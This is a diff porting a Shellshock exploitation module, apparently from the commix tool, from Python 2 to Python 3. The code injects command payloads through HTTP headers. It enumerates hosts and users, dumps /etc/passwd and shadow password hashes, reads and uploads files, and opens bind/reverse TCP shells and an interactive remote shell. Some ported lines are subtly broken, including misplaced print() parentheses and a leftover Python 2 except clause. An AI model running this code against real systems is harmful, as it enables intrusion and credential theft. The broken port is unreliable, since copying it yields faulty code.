@@ -5,16 +5,15 @@ import os
 import sys
 import string
 import random
-import urllib2
-import httplib
-
+from src.thirdparty.six.moves import urllib as _urllib
+from src.thirdparty.six.moves import input as _input
+from src.thirdparty.six.moves import http_client as _http_client
 from src.utils import menu
 from src.utils import logs
 from src.utils import settings
 from src.core.requests import tor
 from src.core.requests import proxy
 from src.thirdparty.colorama import Fore, Back, Style, init
-
 from src.core.shells import bind_tcp
 from src.core.shells import reverse_tcp
 from src.core.requests import parameters
@@ -95,17 +94,17 @@ def enumeration(url, cve, check_header, filename):
     cmd = settings.HOSTNAME
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
-      success_msg = "The hostname is " +  shell
+      success_msg = "The hostname is " +  str(shell)
       sys.stdout.write(settings.print_success_msg(success_msg) + ".\n")
       sys.stdout.flush()
       # Add infos to logs file. 
       output_file = open(filename, "a")
-      success_msg = "The hostname is " + shell + ".\n"
+      success_msg = "The hostname is " + str(shell) + ".\n"
       output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
       output_file.close()
     else:
       warn_msg = "Heuristics have failed to identify the hostname."
-      print settings.print_warning_msg(warn_msg) 
+      print(settings.print_warning_msg(warn_msg)) 
     settings.ENUMERATION_DONE = True
 
   #-------------------------------
@@ -123,14 +122,14 @@ def enumeration(url, cve, check_header, filename):
         cmd = settings.RECOGNISE_HP
         target_arch, payload = cmd_exec(url, cmd, cve, check_header, filename)
         if target_arch:
-          success_msg = "The target operating system is " +  target_os + Style.RESET_ALL  
-          success_msg += Style.BRIGHT + " and the hardware platform is " +  target_arch
+          success_msg = "The target operating system is " +  str(target_os) + Style.RESET_ALL  
+          success_msg += Style.BRIGHT + " and the hardware platform is " +  str(target_arch)
           sys.stdout.write(settings.print_success_msg(success_msg) + ".\n")
           sys.stdout.flush()
           # Add infos to logs file.   
           output_file = open(filename, "a")
-          success_msg = "The target operating system is " + target_os
-          success_msg += " and the hardware platform is " + target_arch + ".\n"
+          success_msg = "The target operating system is " + str(target_os)
+          success_msg += " and the hardware platform is " + str(target_arch) + ".\n"
           output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
           output_file.close()
       else:
@@ -139,12 +138,12 @@ def enumeration(url, cve, check_header, filename):
         sys.stdout.flush()
         # Add infos to logs file.    
         output_file = open(filename, "a")
-        success_msg = "The target operating system is " + target_os + ".\n"
+        success_msg = "The target operating system is " + str(target_os) + ".\n"
         output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
         output_file.close()
     else:
       warn_msg = "Heuristics have failed to retrieve the system information."
-      print settings.print_warning_msg(warn_msg)
+      print(settings.print_warning_msg(warn_msg))
     settings.ENUMERATION_DONE = True
 
   #-------------------------------
@@ -158,11 +157,11 @@ def enumeration(url, cve, check_header, filename):
         cmd = re.findall(r"" + "\$(.*)", settings.IS_ROOT)
         cmd = ''.join(cmd).replace("(","").replace(")","")
         shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-        success_msg = "The current user is " +  cu_account  
+        success_msg = "The current user is " +  str(cu_account)  
         sys.stdout.write(settings.print_success_msg(success_msg))
         # Add infos to logs file.    
         output_file = open(filename, "a")
-        success_msg = "The current user is " + cu_account
+        success_msg = "The current user is " + str(cu_account)
         output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
         output_file.close()
         if shell:
@@ -181,17 +180,17 @@ def enumeration(url, cve, check_header, filename):
             output_file.write(" and it is privileged.\n")
             output_file.close()
       else:
-        success_msg = "The current user is " +  cu_account  
+        success_msg = "The current user is " +  str(cu_account)  
         sys.stdout.write(settings.print_success_msg(success_msg))
         sys.stdout.flush()
         # Add infos to logs file.   
         output_file = open(filename, "a")
-        success_msg = "The current user is " + cu_account + "\n"
+        success_msg = "The current user is " + str(cu_account) + "\n"
         output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
         output_file.close()  
     else:
       warn_msg = "Heuristics have failed to identify the current user."
-      print settings.print_warning_msg(warn_msg)
+      print(settings.print_warning_msg(warn_msg))
     settings.ENUMERATION_DONE = True
 
   #-------------------------------
@@ -217,9 +216,9 @@ def enumeration(url, cve, check_header, filename):
           sys.stdout.flush()
           warn_msg = "It seems that '" + settings.PASSWD_FILE 
           warn_msg += "' file is not in the appropriate format. Thus, it is expoted as a text file." 
-          print "\n" + settings.print_warning_msg(warn_msg) 
+          print("\n" + settings.print_warning_msg(warn_msg)) 
           sys_users = " ".join(str(p) for p in sys_users).strip()
-          print sys_users
+          print(sys_users)
           output_file = open(filename, "a")
           output_file.write("      " + sys_users)
           output_file.close()
@@ -272,7 +271,7 @@ def enumeration(url, cve, check_header, filename):
                 else :
                   is_privileged = ""
                   is_privileged_nh = ""
-                print "    (" +str(count)+ ") '" + Style.BRIGHT +  fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
+                print("    (" +str(count)+ ") '" + Style.BRIGHT +  fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.") 
                 # Add infos to logs file.   
                 output_file = open(filename, "a")
                 output_file.write("    (" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
@@ -282,9 +281,9 @@ def enumeration(url, cve, check_header, filename):
                   warn_msg = "It seems that '" + settings.PASSWD_FILE 
                   warn_msg += "' file is not in the appropriate format. "
                   warn_msg += "Thus, it is expoted as a text file." 
-                  print settings.print_warning_msg(warn_msg) 
+                  print(settings.print_warning_msg(warn_msg)) 
                 sys_users = " ".join(str(p) for p in sys_users.split(":"))
-                print sys_users
+                print(sys_users)
                 output_file = open(filename, "a")
                 output_file.write("      " + sys_users)
                 output_file.close()
@@ -293,7 +292,7 @@ def enumeration(url, cve, check_header, filename):
         sys.stdout.flush()
         warn_msg = "It seems that you don't have permissions to read '" 
         warn_msg += settings.PASSWD_FILE + "' to enumerate users entries."
-        print "\n" + settings.print_warning_msg(warn_msg)   
+        print("\n" + settings.print_warning_msg(warn_msg))   
     except TypeError:
       sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]\n")
       sys.stdout.flush()
@@ -340,7 +339,7 @@ def enumeration(url, cve, check_header, filename):
             if ":" in line:
               fields = line.split(":")
               if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
-                print "    (" +str(count)+ ") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
+                print("    (" +str(count)+ ") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1] + Style.RESET_ALL)
                 # Add infos to logs file.   
                 output_file = open(filename, "a")
                 output_file.write("    (" +str(count)+ ") " + fields[0] + " : " + fields[1] + "\n")
@@ -352,14 +351,14 @@ def enumeration(url, cve, check_header, filename):
               warn_msg += "' file is not in the appropriate format. "
               warn_msg += "Thus, it is expoted as a text file."
               sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
-            print fields[0]
+            print(fields[0])
             output_file = open(filename, "a")
             output_file.write("      " + fields[0])
             output_file.close()
       else:
         warn_msg = "It seems that you don't have permissions to read '"
         warn_msg += settings.SHADOW_FILE + "' to enumerate users password hashes."
-        print settings.print_warning_msg(warn_msg)
+        print(settings.print_warning_msg(warn_msg))
     settings.ENUMERATION_DONE = True  
 
 """
@@ -425,14 +424,14 @@ def file_access(url, cve, check_header, filename):
     file_to_upload = menu.options.file_upload
     # check if remote file exists.
     try:
-      urllib2.urlopen(file_to_upload)
-    except urllib2.HTTPError, warn_msg:
+      _urllib.request.urlopen(file_to_upload)
+    except _urllib.error.HTTPError, warn_msg:
       warn_msg = "It seems that the '" + file_to_upload + "' file, "
       warn_msg += "does not exist. (" + str(warn_msg) + ")\n"
       sys.stdout.write(settings.print_critical_msg(warn_msg))
       sys.stdout.flush()
       raise SystemExit()
-    except ValueError, err_msg:
+    except ValueError as err_msg:
       err_msg = str(err_msg[0]).capitalize() + str(err_msg)[1]
       sys.stdout.write(settings.print_critical_msg(err_msg) + "\n")
       sys.stdout.flush()
@@ -481,7 +480,7 @@ def file_access(url, cve, check_header, filename):
       success_msg += file_to_read + "'" + Style.RESET_ALL + ": "  
       sys.stdout.write(settings.print_success_msg(success_msg))
       sys.stdout.flush()
-      print shell
+      print(shell)
       output_file = open(filename, "a")
       success_msg = "The contents of file '"
       success_msg += file_to_read + "' : " + shell + ".\n"
@@ -495,7 +494,7 @@ def file_access(url, cve, check_header, filename):
     settings.FILE_ACCESS_DONE = True
 
   if settings.FILE_ACCESS_DONE == True:
-    print ""
+    print("")
 
 """
 Execute the bind / reverse TCP shell
@@ -504,11 +503,11 @@ def execute_shell(url, cmd, cve, check_header, filename, os_shell_option):
 
   shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
   if settings.VERBOSITY_LEVEL >= 1:
-    print ""
+    print("")
 
   err_msg = "The " + os_shell_option.split("_")[0] + " "
   err_msg += os_shell_option.split("_")[1].upper() + " connection has failed!"
-  print settings.print_critical_msg(err_msg)
+  print(settings.print_critical_msg(err_msg))
 
 """
 Configure the bind TCP shell
@@ -594,7 +593,7 @@ def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_r
   # The "os_shell" option
   elif os_shell_option == "os_shell": 
     warn_msg = "You are already into the '" + os_shell_option + "' mode."
-    print settings.print_warning_msg(warn_msg)+ "\n"
+    print(settings.print_warning_msg(warn_msg))+ "\n"
 
   # The "bind_tcp" option
   elif os_shell_option == "bind_tcp":
@@ -646,11 +645,11 @@ def shellshock_handler(url, http_request_method, filename):
           sys.stdout.write("\n" + settings.print_payload(payload))
         elif settings.VERBOSITY_LEVEL > 1:
           info_msg = "Generating a payload for injection..."
-          print settings.print_info_msg(info_msg)
-          print settings.print_payload(payload)
+          print(settings.print_info_msg(info_msg))
+          print(settings.print_payload(payload))
 
         header = {check_header : payload}
-        request = urllib2.Request(url, None, header)
+        request = _urllib.request.Request(url, None, header)
         if check_header == "User-Agent":
           menu.options.agent = payload
         else:
@@ -664,7 +663,7 @@ def shellshock_handler(url, http_request_method, filename):
         elif menu.options.tor:
           response = tor.use_tor(request)
         else:
-          response = urllib2.urlopen(request)
+          response = _urllib.request.urlopen(request)
         percent = ((i*100)/total)
         float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
         
@@ -713,19 +712,19 @@ def shellshock_handler(url, http_request_method, filename):
           success_msg += url + Style.RESET_ALL + Style.BRIGHT 
           success_msg += "' seems vulnerable via " + technique + "."
           if settings.VERBOSITY_LEVEL <= 1:
-            print ""
-          print settings.print_success_msg(success_msg)
-          print settings.SUB_CONTENT_SIGN + "Payload: " + "\"" + payload + "\"" + Style.RESET_ALL
+            print("")
+          print(settings.print_success_msg(success_msg))
+          print(settings.SUB_CONTENT_SIGN + "Payload: " + "\"" + payload + "\"" + Style.RESET_ALL)
 
           # Enumeration options.
           if settings.ENUMERATION_DONE == True :
             if settings.VERBOSITY_LEVEL >= 1:
-              print ""
+              print("")
             while True:
               if not menu.options.batch:
                 question_msg = "Do you want to enumerate again? [Y/n] > "
-                sys.stdout.write(settings.print_question_msg(question_msg))
-                enumerate_again = sys.stdin.readline().replace("\n","").lower()
+                enumerate_again = _input(settings.print_question_msg(question_msg))
+
               else:
                  enumerate_again = "" 
               if len(enumerate_again) == 0:
@@ -739,7 +738,7 @@ def shellshock_handler(url, http_request_method, filename):
                 raise SystemExit()
               else:
                 err_msg = "'" + enumerate_again + "' is not a valid answer."  
-                print settings.print_error_msg(err_msg)
+                print(settings.print_error_msg(err_msg))
                 pass
           else:
             enumeration(url, cve, check_header, filename)
@@ -749,8 +748,7 @@ def shellshock_handler(url, http_request_method, filename):
             while True:
               if not menu.options.batch:
                 question_msg = "Do you want to access files again? [Y/n] > "
-                sys.stdout.write(settings.print_question_msg(question_msg))
-                file_access_again = sys.stdin.readline().replace("\n","").lower()
+                file_access_again = _input(settings.print_question_msg(question_msg))
               else:
                  file_access_again= "" 
               if len(file_access_again) == 0:
@@ -764,7 +762,7 @@ def shellshock_handler(url, http_request_method, filename):
                 raise SystemExit()
               else:
                 err_msg = "'" + file_access_again  + "' is not a valid answer."  
-                print settings.print_error_msg(err_msg)
+                print(settings.print_error_msg(err_msg))
                 pass
           else:
             file_access(url, cve, check_header, filename)
@@ -772,12 +770,12 @@ def shellshock_handler(url, http_request_method, filename):
           if menu.options.os_cmd:
             cmd = menu.options.os_cmd 
             shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-            print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL 
+            print("\n") + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL 
             raise SystemExit()
 
           else:
             # Pseudo-Terminal shell
-            print ""
+            print("")
             go_back = False
             go_back_again = False
             while True:
@@ -785,16 +783,15 @@ def shellshock_handler(url, http_request_method, filename):
                 break
               if not menu.options.batch:
                 question_msg = "Do you want a Pseudo-Terminal shell? [Y/n] > "
-                sys.stdout.write(settings.print_question_msg(question_msg))
-                gotshell = sys.stdin.readline().replace("\n","").lower()
+                gotshell = _input(settings.print_question_msg(question_msg))
               else:
                 gotshell= ""  
               if len(gotshell) == 0:
                  gotshell= "y"
               if gotshell in settings.CHOICE_YES:
                 if not menu.options.batch:
-                  print ""
-                print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
+                  print("")
+                print("Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
                 if readline_error:
                   checks.no_readline_module()
                 while True:
@@ -808,7 +805,7 @@ def shellshock_handler(url, http_request_method, filename):
                       # Unix tab compliter
                       else:
                         readline.parse_and_bind("tab: complete")
-                    cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
+                    cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                     cmd = checks.escaped_cmd(cmd)
                     
                     if cmd.lower() in settings.SHELL_OPTIONS:
@@ -822,7 +819,7 @@ def shellshock_handler(url, http_request_method, filename):
                       if shell != "":
                         # Update logs with executed cmds and execution results.
                         logs.executed_command(filename, cmd, shell)
-                        print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
+                        print("\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n")
                       else:
                         info_msg = "Executing the '" + cmd + "' command... "
                         if settings.VERBOSITY_LEVEL == 1:
@@ -835,7 +832,7 @@ def shellshock_handler(url, http_request_method, filename):
                           sys.stdout.flush()
                           sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
                         err_msg = "The '" + cmd + "' command, does not return any output."
-                        print settings.print_critical_msg(err_msg) + "\n"
+                        print(settings.print_critical_msg(err_msg) + "\n")
 
                   except KeyboardInterrupt:
                     raise
@@ -845,7 +842,7 @@ def shellshock_handler(url, http_request_method, filename):
 
                   except EOFError:
                     err_msg = "Exiting, due to EOFError."
-                    print settings.print_error_msg(err_msg)
+                    print(settings.print_error_msg(err_msg))
                     raise
 
                   except:
@@ -870,37 +867,37 @@ def shellshock_handler(url, http_request_method, filename):
 
               else:
                 err_msg = "'" + gotshell + "' is not a valid answer."  
-                print settings.print_error_msg(err_msg)
+                print(settings.print_error_msg(err_msg))
                 continue
               break
         else:
           continue
           
     if no_result and settings.VERBOSITY_LEVEL < 2:
-      print ""
+      print("")
 
-  except urllib2.HTTPError, err_msg:
+  except _urllib.error.HTTPError as err_msg:
     if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
       response = False  
     elif settings.IGNORE_ERR_MSG == False:
       err = str(err_msg) + "."
-      print "\n" + settings.print_critical_msg(err)
+      print("\n") + settings.print_critical_msg(err)
       continue_tests = checks.continue_tests(err_msg)
       if continue_tests == True:
         settings.IGNORE_ERR_MSG = True
       else:
         raise SystemExit()
 
-  except urllib2.URLError, err_msg:
+  except _urllib.error.URLError as err_msg:
     err_msg = str(err_msg.reason).split(" ")[2:]
     err_msg = ' '.join(err_msg)+ "."
     if settings.VERBOSITY_LEVEL >= 1 and settings.LOAD_SESSION == False:
-      print ""
-    print settings.print_critical_msg(err_msg)
+      print("")
+    print(settings.print_critical_msg(err_msg))
     raise SystemExit()
 
-  except httplib.IncompleteRead, err_msg:
-    print settings.print_critical_msg(err_msg + ".")
+  except _http_client.IncompleteRead as err_msg:
+    print(settings.print_critical_msg(err_msg + "."))
     raise SystemExit()  
     
 """
@@ -927,7 +924,7 @@ def cmd_exec(url, cmd, cve, check_header, filename):
         sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
 
       header = {check_header : payload}
-      request = urllib2.Request(url, None, header)
+      request = _urllib.request.Request(url, None, header)
       if check_header == "User-Agent":
         menu.options.agent = payload
       else:
@@ -941,14 +938,14 @@ def cmd_exec(url, cmd, cve, check_header, filename):
       elif menu.options.tor:
         response = tor.use_tor(request)
       else:
-        response = urllib2.urlopen(request)
+        response = _urllib.request.urlopen(request)
       shell = response.read().rstrip().replace('\n',' ')
       shell = re.findall(r"" + TAG + "(.*)" + TAG, shell)
       shell = ''.join(shell)
       return shell, payload
 
-    except urllib2.URLError, err_msg:
-      print "\n" + settings.print_critical_msg(err_msg)
+    except _urllib.error.URLError as err_msg:
+      print("\n" + settings.print_critical_msg(err_msg))
       raise SystemExit()
 
   shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
